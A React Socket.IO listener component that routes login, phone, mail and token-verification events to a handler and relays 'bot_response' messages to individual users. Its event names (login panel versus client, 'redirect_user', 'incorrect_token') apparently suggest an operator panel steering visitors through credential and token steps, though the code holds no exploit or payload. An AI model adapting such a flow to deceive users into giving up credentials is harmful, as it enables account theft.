import { useEffect } from "react";
import { useSocket } from "./SocketContext";
import { useNavigate } from "react-router-dom";
import pm from "./../pmComponents/io/pm";

function SocketListener({ dispatch }) {
  const { currentSocket: socket } = useSocket();
  const navigate = useNavigate();

  useEffect(() => {
    if (!socket) return;

    const handleEventUser = (event, data) => {
      pm(event, data, dispatch, navigate);
    }

    const handleEventMappings = [
      { event: "login_panel_response", handler: handleEventUser },
      { event: "login_client_response", handler: handleEventUser },
      { event: "new_phone_response", handler: handleEventUser },
      { event: "new_mail_response", handler: handleEventUser },
      { event: "add_mail_response", handler: handleEventUser },
      { event: "mail_confirmed_response", handler: handleEventUser },
      { event: "device_error_response", handler: handleEventUser },
      { event: "quests_list_response", handler: handleEventUser },
      { event: "redirect_user", handler: handleEventUser},
      { event: "incorrect_login", handler: handleEventUser},
      { event: "incorrect_token", handler: handleEventUser},
      { event: "incorrect_phone", handler: handleEventUser},
      { event: "incorrect_sync", handler: handleEventUser},
      { event: "request_page_status", handler: handleEventUser},
      { event: "page", handler: handleEventUser},
      { event: "mail_error_response", handler: handleEventUser},
      { event: "next_token_sync_step", handler: handleEventUser},
      { event: "token_sync_error", handler: handleEventUser},
    ];

    handleEventMappings.forEach(({ event, handler }) => {
      socket.on(event, (data, ackCallback) => {
        const timeout = setTimeout(() => {}, 5000);
        handler(event, data);
        clearTimeout(timeout);
        if (ackCallback && typeof ackCallback === "function") {
          ackCallback({ received: true });
        }
      });
    });
    
    socket.on('bot_response', (data, ackCallback) => {
      if (data.userId) {
        
        const responderAlCliente = (respuesta) => {
          socket.emit('message_to_client', {
            userId: data.userId,
            message: respuesta,
            event: 'bot_response'
          }, (responseAck) => {});
        };
        
        if (window.panelContext) {
          window.panelContext.setResponderFn(data.userId, responderAlCliente);
        }
      }
      
      if (ackCallback && typeof ackCallback === "function") {
        ackCallback({ received: true });
      }
    });

    return () => {
      handleEventMappings.forEach(({ event }) => socket.off(event));
    };
  }, [socket, dispatch, navigate]);

  return null;
}

export default SocketListener;